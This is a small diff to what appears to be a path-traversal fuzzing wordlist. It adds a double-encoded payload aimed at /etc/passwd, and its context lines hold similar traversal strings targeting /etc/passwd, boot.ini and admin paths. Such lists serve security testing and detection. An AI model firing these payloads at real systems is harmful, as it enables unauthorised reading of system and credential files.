@@ -123,6 +123,7 @@
 ..2fetc2fpasswd%00
 =3D “/..” . “%2f..
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+..%252f..%252f..%252fetc/passwd
 admin/access_log
 /admin/install.php
 ../../../administrator/inbox
